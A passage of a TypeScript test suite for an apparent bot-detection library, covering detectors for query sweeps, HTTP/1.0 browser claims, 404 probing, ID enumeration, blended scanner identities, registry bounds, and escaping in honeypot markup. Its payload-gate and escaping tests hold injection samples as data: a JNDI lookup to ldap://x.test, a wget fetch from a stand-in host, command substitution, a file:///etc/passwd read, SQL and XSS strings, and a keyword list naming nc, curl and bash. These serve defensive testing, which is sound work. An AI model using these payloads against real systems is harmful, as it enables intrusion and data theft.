    expect(sweep.verdict).toBe("suspected-bot");

    // The same two hundred requests as distinct paths, which breadth already caught. The
    // point is that the two now agree rather than differing by the shape of a URL.
    const paths = await walk(200, (i) => `/products/item-${i}`);
    expect(paths.verdict).toBe("suspected-bot");
    expect(sweep.score).toBe(paths.score);
    // And it is not double-counted: breadth is what fires on distinct paths, not this.
    expect(swept(paths)).toBe(false);
  });

  it("catches a search sweep with more than one parameter", async () => {
    expect(swept(await walk(200, (i) => `/search?q=term${i}&sort=price`))).toBe(true);
  });

  it("is not fooled by a client that reorders its parameters", async () => {
    // `?a=1&b=2` and `?b=2&a=1` are one request. Otherwise shuffling the query string
    // would manufacture variants for free and this would fire on a single page.
    const handler = new BotHandler({ preset: "protect-content" });
    for (let i = 0; i < 60; i++) {
      const url = i % 2 === 0 ? "/products?sort=price&page=2" : "/products?page=2&sort=price";
      await handler.handle(createFacts({ method: "GET", url, headers, ip: "203.0.113.78", timestamp: 1_700_000_000_000 + i * 400 }));
    }
    const [actor] = handler.registry.top(1, 1_700_000_000_000);
    expect(actor?.distinctQueries).toBe(1);
  });

  it("stays quiet on the shapes ordinary use makes", async () => {
    // A visitor filtering across many pages: plenty of query strings, spread thin.
    expect(swept(await walk(60, (i) => `/c/${i % 20}?sort=${i % 3}`))).toBe(false);
    // Somebody browsing, with the occasional sort.
    expect(swept(await walk(40, (i) => (i % 4 === 0 ? "/products?sort=price" : `/products/item-${i}`)))).toBe(false);
    // No query strings at all.
    expect(swept(await walk(30, (i) => `/article/${i % 6}`))).toBe(false);
  });

  it("refuses a threshold it could never reach", () => {
    // The count saturates at the registry's cap, so a higher threshold would mean a
    // detector that can only ever stay silent. Same guard crawl-breadth makes.
    expect(() => parameterSweepDetector({ threshold: 5_000 })).toThrow(RangeError);
  });
});

/**
 * How a claimed browser moves, rather than what it says.
 *
 * The header checks read one request against the client it claims to be. These read the
 * transport underneath and the verbs across a visit — harder to copy, because they are not
 * in the part of a request most tools let you set. Both were measured as blind spots first:
 * a client claiming Chrome 120 over HTTP/1.0 and one whose whole visit was HEAD each scored
 * exactly what the honest control scored.
 */
describe("reading the transport under a browser's claim", () => {
  const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
  const headers = {
    host: "shop.example",
    "user-agent": UA,
    accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": "en-GB,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-dest": "document",
  };

  const visit = async (count: number, method: string, httpVersion?: string, ua = UA): Promise<Awaited<ReturnType<BotHandler["assess"]>>> => {
    const handler = new BotHandler({ preset: "protect-content" });
    let last: Awaited<ReturnType<BotHandler["assess"]>> | undefined;
    for (let i = 0; i < count; i++) {
      const result = await handler.handle(
        createFacts({
          method,
          url: `/article/${i}`,
          headers: { ...headers, "user-agent": ua },
          ip: "203.0.113.92",
          timestamp: 1_700_000_000_000 + i * 900,
          ...(httpVersion === undefined ? {} : { httpVersion }),
        }),
      );
      last = result.assessment;
    }
    return last as Awaited<ReturnType<BotHandler["assess"]>>;
  };
  const said = (assessment: { evidence: Array<{ detector: string }> }): boolean =>
    assessment.evidence.some((item) => item.detector === "transport-coherence");

  it("reports a browser that negotiated HTTP/1.0", async () => {
    const legacy = await visit(30, "GET", "1.0");
    expect(said(legacy)).toBe(true);
    expect(legacy.verdict).toBe("suspected-bot");
    // The versions a browser actually speaks say nothing.
    expect(said(await visit(30, "GET", "1.1"))).toBe(false);
    expect(said(await visit(30, "GET", "2.0"))).toBe(false);
  });

  it("leaves a client that never claimed to be a browser alone", async () => {
    // curl over HTTP/1.0 is curl being curl. This detector exists to catch a contradiction
    // between claim and transport, and there is no claim here to contradict.
    expect(said(await visit(30, "GET", "1.0", "curl/8.4.0"))).toBe(false);
  });

  it("reports a visit made entirely of HEAD", async () => {
    expect(said(await visit(30, "HEAD", "1.1"))).toBe(true);
  });

  it("says nothing about a handful of HEADs", async () => {
    // One HEAD is a browser checking a link it is about to follow, or a cache revalidating.
    expect(said(await visit(4, "HEAD", "1.1"))).toBe(false);
  });

  it("says nothing when the visit contains ordinary navigation too", async () => {
    const handler = new BotHandler({ preset: "protect-content" });
    let last: Awaited<ReturnType<BotHandler["handle"]>> | undefined;
    for (let i = 0; i < 30; i++) {
      last = await handler.handle(
        createFacts({
          method: i % 5 === 0 ? "HEAD" : "GET",
          url: `/article/${i}`,
          headers,
          ip: "203.0.113.93",
          timestamp: 1_700_000_000_000 + i * 900,
        }),
      );
    }
    expect(said((last as Awaited<ReturnType<BotHandler["handle"]>>).assessment)).toBe(false);
  });

  it("can be switched off where an intermediary is the one speaking HTTP/1.0", async () => {
    // A few older load balancers speak 1.0 to the origin, and then every request arrives
    // that way — the signal would describe the infrastructure rather than the visitor.
    const detector = transportCoherenceDetector({ legacyHttp: false });
    expect(detector.id).toBe("transport-coherence");
  });

  it("stops reading the version by itself once a proxy is trusted", async () => {
    // The version this process sees is the version of the connection *it* accepted. Behind
    // a proxy that is the proxy's connection — nginx still defaults to HTTP/1.0 upstream —
    // so the signal would describe every visitor at once. `proxy.trustProxy` is the
    // deployment saying a proxy terminated the connection, so it settles this too.
    const behind = new BotHandler({ preset: "protect-content", proxy: { trustProxy: true, hops: 1 } });
    let last: Awaited<ReturnType<BotHandler["handle"]>> | undefined;
    for (let i = 0; i < 30; i++) {
      last = await behind.handle(
        createFacts({
          method: "GET",
          url: `/article/${i}`,
          headers: { ...headers, "x-forwarded-for": "203.0.113.94" },
          ip: "10.0.0.1",
          timestamp: 1_700_000_000_000 + i * 900,
          httpVersion: "1.0",
        }),
      );
    }
    expect(said((last as Awaited<ReturnType<BotHandler["handle"]>>).assessment)).toBe(false);
    // The rest of the detector is untouched: a visit made entirely of HEAD still reports.
    const heads = new BotHandler({ preset: "protect-content", proxy: { trustProxy: true, hops: 1 } });
    let head: Awaited<ReturnType<BotHandler["handle"]>> | undefined;
    for (let i = 0; i < 30; i++) {
      head = await heads.handle(
        createFacts({
          method: "HEAD",
          url: `/article/${i}`,
          headers: { ...headers, "x-forwarded-for": "203.0.113.96" },
          ip: "10.0.0.1",
          timestamp: 1_700_000_000_000 + i * 900,
          httpVersion: "1.1",
        }),
      );
    }
    expect(said((head as Awaited<ReturnType<BotHandler["handle"]>>).assessment)).toBe(true);
  });
});

/**
 * What the application answered.
 *
 * The one thing detection cannot see for itself: every verdict is reached *before* the
 * response exists, which is what lets it shape the response and also what hides the status
 * from it. Reported back, it closes the oldest gap in reading a scanner.
 */
describe("reading what the site answered", () => {
  const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
  const headers = {
    host: "shop.example",
    "user-agent": UA,
    accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": "en-GB,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-dest": "document",
  };

  const walk = async (count: number, statusAt?: (index: number) => number): Promise<Awaited<ReturnType<BotHandler["assess"]>>> => {
    const handler = new BotHandler({ preset: "protect-content" });
    let last: Awaited<ReturnType<BotHandler["assess"]>> | undefined;
    for (let i = 0; i < count; i++) {
      const facts = createFacts({ method: "GET", url: `/p/${i}`, headers, ip: "203.0.113.95", timestamp: 1_700_000_000_000 + i * 900 });
      const result = await handler.handle(facts);
      if (statusAt !== undefined) handler.recordOutcome(facts, statusAt(i));
      last = result.assessment;
    }
    return last as Awaited<ReturnType<BotHandler["assess"]>>;
  };
  const probed = (assessment: { evidence: Array<{ detector: string }> }): boolean =>
    assessment.evidence.some((item) => item.detector === "probe-volume");

  it("reports an actor whose requests are almost all misses", async () => {
    expect(probed(await walk(30, () => 404))).toBe(true);
    expect(probed(await walk(30, (i) => (i % 10 === 0 ? 200 : 404)))).toBe(true);
  });

  it("says nothing about a site that has simply moved its URLs", async () => {
    // Half a visit missing is a reader following stale links, not a wordlist.
    expect(probed(await walk(30, (i) => (i % 2 === 0 ? 200 : 404)))).toBe(false);
    expect(probed(await walk(30, () => 200))).toBe(false);
  });

  it("does not count the refusals it caused itself", async () => {
    // A 403 is usually this library's own doing. Counting it would let a rule that
    // challenges an actor manufacture the evidence for having challenged it.
    expect(probed(await walk(30, () => 403))).toBe(false);
    expect(probed(await walk(30, () => 500))).toBe(false);
  });

  it("stays silent when nothing reports anything", async () => {
    // Every other detector works unchanged without this; supplying it sharpens one.
    expect(probed(await walk(30))).toBe(false);
  });

  it("waits for enough reported responses to mean anything", async () => {
    expect(probed(await walk(10, () => 404))).toBe(false);
  });

  it("ignores a status that is not a number", async () => {
    const handler = new BotHandler({ preset: "protect-content" });
    const facts = createFacts({ method: "GET", url: "/p", headers, ip: "203.0.113.96" });
    await handler.handle(facts);
    expect(() => handler.recordOutcome(facts, Number.NaN)).not.toThrow();
  });

  it("does not mind being told about an actor it has forgotten", async () => {
    const handler = new BotHandler({ preset: "protect-content" });
    const facts = createFacts({ method: "GET", url: "/p", headers, ip: "203.0.113.97" });
    await handler.handle(facts);
    handler.forgetActor(handler.actorKeyFor(facts));
    expect(() => handler.recordOutcome(facts, 404)).not.toThrow();
  });
});

/**
 * Working through the identifiers rather than following the links.
 *
 * `crawl-breadth` sees this as "many distinct paths" — which is also what it sees when
 * somebody reads a documentation site, so it stays `weak` and nothing separates the two.
 * Measured before this existed: `/user/1` through `/user/120` in order scored 57, a
 * hundred and twenty scattered ids scored 57, and ordinary article paths scored 57.
 */
describe("catching a walk through the ids", () => {
  const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
  const headers = {
    host: "shop.example",
    "user-agent": UA,
    accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": "en-GB,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-dest": "document",
  };

  const walk = async (count: number, url: (index: number) => string): Promise<Awaited<ReturnType<BotHandler["assess"]>>> => {
    const handler = new BotHandler({ preset: "protect-content" });
    let last: Awaited<ReturnType<BotHandler["assess"]>> | undefined;
    for (let i = 0; i < count; i++) {
      const result = await handler.handle(createFacts({ method: "GET", url: url(i), headers, ip: "203.0.113.98", timestamp: 1_700_000_000_000 + i * 900 }));
      last = result.assessment;
    }
    return last as Awaited<ReturnType<BotHandler["assess"]>>;
  };
  const walked = (assessment: { evidence: Array<{ detector: string }> }): boolean =>
    assessment.evidence.some((item) => item.detector === "id-enumeration");

  it("reports a contiguous run of identifiers", async () => {
    const harvest = await walk(120, (i) => `/user/${i + 1}`);
    expect(walked(harvest)).toBe(true);
    expect(harvest.verdict).toBe("suspected-bot");
    // A few gaps is still a walk.
    expect(walked(await walk(60, (i) => `/user/${500 + i + (i % 12 === 0 ? 1 : 0)}`))).toBe(true);
  });

  it("reads the identifier rather than the version in the path", async () => {
    // `/api/v2/orders/42`: the version is part of the shape, the order id is the walk.
    expect(walked(await walk(60, (i) => `/api/v2/orders/${i + 1}`))).toBe(true);
  });

  it("never reports coverage above the whole range", async () => {
    // A repeated id makes the count exceed the span, and "covering 102% of a range" is
    // not a thing anybody can read.
    const repeated = await walk(90, (i) => `/user/${1 + (i % 60)}`);
    const reported = repeated.evidence.find((item) => item.detector === "id-enumeration");
    expect(reported).toBeDefined();
    const percentage = Number(/covering (\d+)%/.exec(reported?.summary ?? "")?.[1]);
    expect(percentage).toBeLessThanOrEqual(100);
  });

  it("leaves people following links alone", async () => {
    const scattered = [8, 941, 33, 6012, 77, 512, 4, 88123, 231, 19, 7734, 62];
    expect(walked(await walk(120, (i) => `/user/${scattered[i % scattered.length]! * (1 + (i % 7))}`))).toBe(false);
    expect(walked(await walk(120, (i) => `/article/${["a", "b", "c"][i % 3]}-${i}`))).toBe(false);
    // One page, refreshed: a span of one is somebody reloading, not enumerating.
    expect(walked(await walk(60, () => "/user/42"))).toBe(false);
    // Products in a category do carry consecutive ids, so the floor has to sit above what
    // browsing a catalogue produces.
    expect(walked(await walk(20, (i) => `/product/${300 + i}`))).toBe(false);
  });

  it("does not mistake a timestamp for an identifier", async () => {
    // Nobody walks epoch seconds, and treating them as a range makes every span meaningless.
    expect(walked(await walk(60, (i) => `/log/${1_700_000_000 + i}`))).toBe(false);
  });
});

/**
 * Enabling identity-rotation without moving the actor key.
 *
 * The detector reads "one actor, several User-Agents" as one client lying, and under the
 * default actor key one actor is one *address* — so an office, a campus or a mobile
 * carrier's CGNAT pool is a hundred people's browsers wearing one. It is off by default
 * and says so; this catches switching it on without the other half of the change, which
 * is a decision nobody can see the consequences of until real visitors are challenged.
 *
 * Worth recording why the detector cannot simply be made safe instead. A rotator changes
 * the User-Agent and nothing else, so "several User-Agents behind one header shape" looks
 * like a clean discriminator — until it is measured. Ten real browser profiles collapse
 * to six stable shapes, and Chrome, Edge, Opera and Chromium-on-Linux share one, because
 * they are the same engine sending the same headers in the same order. An office running
 * Chrome and Edge is that signature exactly.
 */
describe("enabling identity-rotation", () => {
  const warningsFrom = (options: BotHandlerConfig = {}): string[] => {
    const warnings: string[] = [];
    new BotHandler({ ...options, onWarning: (warning) => warnings.push(warning) });
    return warnings;
  };
  const rotation = (warnings: string[]): boolean => warnings.some((warning) => warning.includes("identity-rotation is enabled"));

  it("says something when it is switched on behind an address", () => {
    const warnings = warningsFrom({ extraDetectors: [identityRotationDetector()] });
    expect(rotation(warnings)).toBe(true);
    // And names the fix rather than only the problem.
    expect(warnings.find((warning) => warning.includes("identity-rotation is enabled"))).toContain("actorKey");
  });

  it("catches it however the detector got into the list", () => {
    expect(rotation(warningsFrom({ detectors: [...defaultDetectors(), identityRotationDetector()] }))).toBe(true);
  });

  it("stays quiet once the actor key is narrower than an address", () => {
    expect(rotation(warningsFrom({ extraDetectors: [identityRotationDetector()], actorKey: (facts: RequestFacts) => `${facts.ip}|${facts.tlsFingerprint ?? ""}` }))).toBe(false);
  });

  it("stays quiet when the detector is not enabled, which is the default", () => {
    expect(rotation(warningsFrom())).toBe(false);
  });
});

/**
 * What a series of claims says, as opposed to what one claim says.
 *
 * Every other identity check here reads a single request. The set of identities an actor
 * has claimed over time is a different object, and some sets are self-contradictory in a
 * way no member of them is.
 *
 * These hold under the default address-based actor key, which is why they are on and
 * `identity-rotation` is not. A NAT presents many browsers — that is exactly what makes
 * counting User-Agents useless there. It does not present sqlmap *and* nikto.
 */
describe("reading the set of identities an actor has claimed", () => {
  const SQLMAP = "sqlmap/1.7.2#stable (http://sqlmap.org)";
  const NIKTO = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)";
  const GOOGLE = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
  const BING = "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)";
  const CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
  // Nothing can be confirmed or refuted, so anything found is found from the claims alone.
  const resolver = failingResolver();

  const visit = async (agents: readonly string[], paths?: readonly string[]): Promise<Awaited<ReturnType<BotHandler["assess"]>>> => {
    const handler = new BotHandler({ preset: "protect-content", resolver });
    let last: Awaited<ReturnType<BotHandler["assess"]>> | undefined;
    for (let i = 0; i < agents.length; i++) {
      const result = await handler.handle(
        createFacts({
          method: "GET",
          url: paths?.[i] ?? `/page/${i}`,
          headers: { host: "shop.example", "user-agent": agents[i] ?? "", accept: "*/*" },
          ip: "203.0.113.151",
          timestamp: 1_700_000_000_000 + i * 1000,
        }),
      );
      last = result.assessment;
    }
    return last as Awaited<ReturnType<BotHandler["assess"]>>;
  };
  const blended = (assessment: { evidence: Array<{ detector: string; summary: string }> }): string[] =>
    assessment.evidence.filter((item) => item.detector === "blended-identity").map((item) => item.summary);

  it("reads two named security tools from one address as a scan", async () => {
    expect(blended(await visit([SQLMAP, NIKTO])).join(" ")).toContain("2 different security tools");
    // One is a tool. Two is a scan.
    expect(blended(await visit([SQLMAP, SQLMAP, SQLMAP]))).toEqual([]);
  });

  it("reads two crawler claims as a forgery, with no lookup at all", async () => {
    // At most one of these can be true of an address: each operator publishes a proof tied
    // to addresses it controls. With DNS unreachable neither claim can be refuted on its
    // own, and the pair still contradicts itself.
    const both = blended(await visit([GOOGLE, BING, GOOGLE])).join(" ");
    expect(both).toContain("2 crawler identities");
    expect(blended(await visit([GOOGLE, GOOGLE, GOOGLE]))).toEqual([]);
  });

  it("reads a crawler claim beside a scanner payload as the answer to which is the lie", async () => {
    // The payload is noted after its own request is assessed, so it is the *next* request
    // that sees it — this is a cross-request reading by construction.
    const found = blended(await visit([GOOGLE, GOOGLE, GOOGLE], ["/", "/?id=1' OR '1'='1", "/next"])).join(" ");
    expect(found).toContain("scanner payload");
  });

  it("stays quiet behind a gateway, which is where identity-rotation cannot", async () => {
    const nat = [CHROME, CHROME.replace("Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7"), CHROME.replace("Chrome/120", "Chrome/121")];
    expect(blended(await visit(nat))).toEqual([]);
    // An office whose staff browse while a crawler indexes the same site.
    expect(blended(await visit([GOOGLE, CHROME]))).toEqual([]);
  });

  it("does not reach `certain`, because a misconfigured proxy makes the same set", async () => {
    // Trusting the wrong forwarded header collapses every client onto one address, and
    // then two genuinely different crawlers look like one client lying.
    for (const summary of await visit([GOOGLE, BING]).then((a) => a.evidence.filter((item) => item.detector === "blended-identity"))) {
      expect(summary.certainty).not.toBe("certain");
    }
  });
});

/**
 * What a client can make an actor cost.
 *
 * Everything the registry remembers is keyed on something the client chose — the path, the
 * query, the method — so every one of them needs a bound, and the bounds need a test
 * because they are invisible when they work. Two of these were found by measuring rather
 * than by reading: walk templates were kept as the whole path, at 20.6 kB per actor and
 * roughly four hundred megabytes across a full registry; and building those templates by
 * concatenation cost 3.65µs per request against 199ns for an ordinary path, which is an
 * eighteen-fold tax anyone could levy by sending a long URL.
 */
describe("what a hostile path can cost the registry", () => {
  const at = 1_700_000_000_000;
  const record = (state: ActorState, url: string, index = 0): void => {
    state.record(createFacts({ method: "GET", url, headers: { host: "shop.test", "user-agent": "curl/8.4.0" }, ip: "203.0.113.4", timestamp: at + index }));
  };

  it("does not keep a whole path as a key", () => {
    const state = new ActorState("k", at);
    const deep = `/${Array.from({ length: 12 }, (_, i) => "segment".repeat(4) + i).join("/")}/42`;
    record(state, deep);
    const walk = state.densestWalk();
    // Kept, because it is a walk — but not at its original length.
    expect(walk).toBeDefined();
    expect(walk?.template.length).toBeLessThanOrEqual(121);
    expect(deep.length).toBeGreaterThan(200);
  });

  it("ignores a path too deep to be a shape anybody walks", () => {
    const state = new ActorState("k", at);
    for (let i = 0; i < 40; i++) record(state, `/${Array.from({ length: 40 }, (_, n) => `s${n}`).join("/")}/${i}`, i);
    expect(state.densestWalk()).toBeUndefined();
  });

  it("ignores a path too long to be one either", () => {
    const state = new ActorState("k", at);
    for (let i = 0; i < 40; i++) record(state, `/${"x".repeat(2_000)}/${i}`, i);
    expect(state.densestWalk()).toBeUndefined();
  });

  it("still finds the walks that matter", () => {
    // The bounds are worthless if they also exclude the thing being looked for.
    const state = new ActorState("k", at);
    for (let i = 0; i < 40; i++) record(state, `/api/v2/orders/${i}`, i);
    expect(state.densestWalk()).toEqual({ template: "/api/v2/orders/#", count: 40, span: 40 });
  });

  it("does not fold an unreasonable number of query parameters", () => {
    const state = new ActorState("k", at);
    const many = Array.from({ length: 300 }, (_, i) => `k${i}=${i}`).join("&");
    for (let i = 0; i < 10; i++) record(state, `/x?${many}&n=${i}`, i);
    // Not counted: sorting three hundred keys per request is work a client should not be
    // able to ask for, and a signature over them says nothing anyway.
    expect(state.distinctQueries).toBe(0);
    // A normal query still counts.
    const ordinary = new ActorState("k2", at);
    for (let i = 0; i < 10; i++) record(ordinary, `/products?page=${i}&sort=price`, i);
    expect(ordinary.distinctQueries).toBe(10);
  });

  it("keeps every per-actor structure bounded", () => {
    const state = new ActorState("k", at);
    for (let i = 0; i < 500; i++) {
      state.record(
        createFacts({
          method: ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", `X${i}`][i % 8] ?? "GET",
          url: `/shape${i}/${i}?p=${i}`,
          headers: { host: "shop.test", "user-agent": `agent-${i}` },
          ip: "203.0.113.4",
          timestamp: at + i,
        }),
      );
      state.noteIdentity(`bot-${i}`, "search", false);
    }
    expect(state.distinctQueries).toBeLessThanOrEqual(64);
    expect(state.methodsSeen.length).toBeLessThanOrEqual(12);
    expect(state.claimedIdentities.size).toBeLessThanOrEqual(12);
    expect(state.distinctPaths).toBeLessThanOrEqual(64);
  });
});

/**
 * `probe-signature` runs nine regular expressions over every query value, and a request
 * may carry sixty-four of them — five hundred and seventy-six evaluations, which took the
 * detector from 4.5us to 35.5us and doubled the cost of the whole assessment on nothing
 * but a long URL. A one-character gate skips values that cannot match.
 *
 * A gate like that is a second, weaker copy of the thing it guards, and the failure mode
 * is silent: widen a pattern later, forget the gate, and injection detection quietly
 * stops working on the values the gate rejects. That is a security hole rather than a
 * slowdown, so it is not left to review. This asserts the property directly — over
 * random strings built from the pieces the patterns are made of, nothing the gate
 * rejects may match anything the gate guards.
 */
describe("the payload gate cannot hide a payload", () => {
  const { PAYLOADS, PAYLOAD_GATE } = __payloadInternals;

  it("rejects only values that no pattern could have matched", () => {
    // Fragments of the patterns themselves, so the random strings land near the edges
    // rather than in open space.
    const pieces = [
      "union", "select", "all", "or", "1", "=", "'", '"', "sleep", "(", ")", "pg_sleep", "waitfor", "delay",
      "<", "script", ">", "onerror", "onload", "onmouseover", "$", "{", "jndi", ":", "ldap", "//", "`",
      "wget", "curl", "nc", "bash", "sh", "cat", "ls", "id", "whoami", "uname", "python", "perl",
      "file", "php", "expect", ";", "&", "|", " ", "\t", "\n", "-", "*", "/", "%27", "%22", "a", "Z", "9", "_", ".", "é",
    ];
    let rejected = 0;
    for (let round = 0; round < 300_000; round++) {
      let value = "";
      const n = 1 + Math.floor(Math.random() * 8);
      for (let i = 0; i < n; i++) value += pieces[Math.floor(Math.random() * pieces.length)];
      if (PAYLOAD_GATE.test(value)) continue;
      rejected++;
      for (const { pattern, what } of PAYLOADS) {
        // A failure here names the value and the pattern, which is what makes it fixable.
        if (pattern.test(value)) throw new Error(`gate rejected ${JSON.stringify(value)} but ${what} matches it`);
      }
    }
    // The fuzz is worthless if it never actually exercised the rejecting branch.
    expect(rejected).toBeGreaterThan(1000);
  });

  it("lets through a known example of every pattern it guards", () => {
    const samples = [
      "${jndi:ldap://x.test/a}",
      "; wget http://x.test/s",
      "$(whoami)",
      "file:///etc/passwd",
      "1 union select null",
      "1 or '1'='1",
      "1 and sleep(5)",
      "<script>alert(1)</script>",
      "x onerror=alert(1)",
    ];
    expect(samples.length).toBe(PAYLOADS.length);
    for (const sample of samples) {
      expect(PAYLOAD_GATE.test(sample), `gate rejected ${sample}`).toBe(true);
      expect(PAYLOADS.some(({ pattern }) => pattern.test(sample)), `no pattern matched ${sample}`).toBe(true);
    }
  });

  it("still finds a payload hidden among many ordinary parameters", async () => {
    // The point of the gate is that the sixty-third parameter is still read.
    const filler = Array.from({ length: 60 }, (_, i) => `key${i}=value${i}`).join("&");
    const handler = new BotHandler({ onWarning: () => {} });
    const assessment = await handler.assess(
      createFacts({
        method: "GET",
        url: `/search?${filler}&q=${encodeURIComponent("${jndi:ldap://x.test/a}")}`,
        headers: { host: "shop.test", "user-agent": "curl/8.4.0" },
        ip: "203.0.113.30",
      }),
    );
    const probe = assessment.evidence.find((item) => item.detector === "probe-signature");
    expect(probe?.summary).toContain("JNDI");
  });
});

/**
 * The three helpers that emit markup into somebody else's page.
 *
 * They had no tests at all — `entry-points.test.ts` checked that the names were exported
 * and nothing checked what they produced. That is the wrong place to have a gap: their
 * output is HTML an operator pastes into their own site, so an escaping regression here
 * would be an injection the library handed them, and it would not fail anything.
 */
describe("the markup the trap helpers hand an operator", () => {
  const HOSTILE = ['"><script>alert(1)</script>', "' onmouseover='alert(1)", "<img src=x onerror=alert(1)>", "a&b"];

  /**
   * Counting the tags the function opens is the assertion that actually means something.
   * A payload that escaped its attribute would have to introduce a `<` of its own, so a
   * template that emits exactly N of them and still emits N has not been broken out of.
   */
  const angleBrackets = (html: string): number => html.split("<").length - 1;

  it("escapes a hostile label rather than emitting it", () => {
    for (const bad of HOSTILE) {
      const html = renderTrapLink("/archive", { label: bad });
      expect(html, bad).toContain('href="/archive"');
      // Verbatim is the tell: an unescaped payload appears exactly as it was passed.
      expect(html.includes(bad), bad).toBe(false);
      // `<a …>` and `</a>`, and nothing the label brought with it.
      expect(angleBrackets(html), bad).toBe(2);
    }
  });

  it("escapes a hostile field name in every place it puts it", () => {
    for (const bad of HOSTILE) {
      const html = renderTrapField(bad);
      expect(html.includes(bad), bad).toBe(false);
      // `<div>`, `<label>`, `</label>`, `<input>`, `</div>` — five, and no more.
      expect(angleBrackets(html), bad).toBe(5);
      // The name lands in three attributes, and the escaped form is what appears.
      expect(html.match(/&quot;|&#39;|&lt;|&amp;/), bad).not.toBeNull();
    }
  });

  it("works with no argument, the way the documentation shows it", () => {
    // `docs/detection/detectors.md` has always written `renderTrapLink()`, and until this
    // defaulted that example threw — copy it into a route handler and the route 500s.
    // `trapRobotsEntries` already defaults to the same shipped paths.
    const html = renderTrapLink();
    expect(html).toContain(`href="${DEFAULT_TRAP_PATHS[0] as string}"`);
    expect(() => renderTrapLink()).not.toThrow();
  });

  it("refuses a path that could never be a trap", () => {
    // A trap is matched against `facts.path`, which always begins with a slash. Anything
    // else is decoration that can never fire — and it is how a scheme would reach the
    // href, which escaping does not prevent.
    expect(() => renderTrapLink("javascript:alert(1)")).toThrow(/must begin with/);
    expect(() => renderTrapLink("https://example.test/trap")).toThrow(/must begin with/);
    expect(() => renderTrapLink("")).toThrow(/must begin with/);
    expect(() => renderTrapLink("/legitimate")).not.toThrow();
  });

  it("keeps the link away from people and from crawlers that ask", () => {
    // The point of the markup: a screen reader and a keyboard must never reach it, and a
    // crawler that obeys instructions should be told not to follow it.
    const html = renderTrapLink("/archive");
    expect(html).toContain('aria-hidden="true"');
    expect(html).toContain('tabindex="-1"');
    expect(html).toContain("nofollow");
  });

  it("hides the honeypot field from people the same way", () => {
    const html = renderTrapField("website");
    expect(html).toContain('aria-hidden="true"');
    expect(html).toContain('tabindex="-1"');
    expect(html).toContain('autocomplete="off"');
    expect(html).toContain('name="website"');
  });

  it("writes robots.txt lines for the paths it is given", () => {
    expect(trapRobotsEntries(["/archive", "/old"])).toBe("User-agent: *\nDisallow: /archive\nDisallow: /old");
    // The default set is what an operator gets when they pass nothing, and every one of
    // them has to be site-relative or it could not be a trap in the first place.
    expect(trapRobotsEntries().startsWith("User-agent: *\n")).toBe(true);
    expect(DEFAULT_TRAP_PATHS.every((path) => path.startsWith("/"))).toBe(true);
  });
});
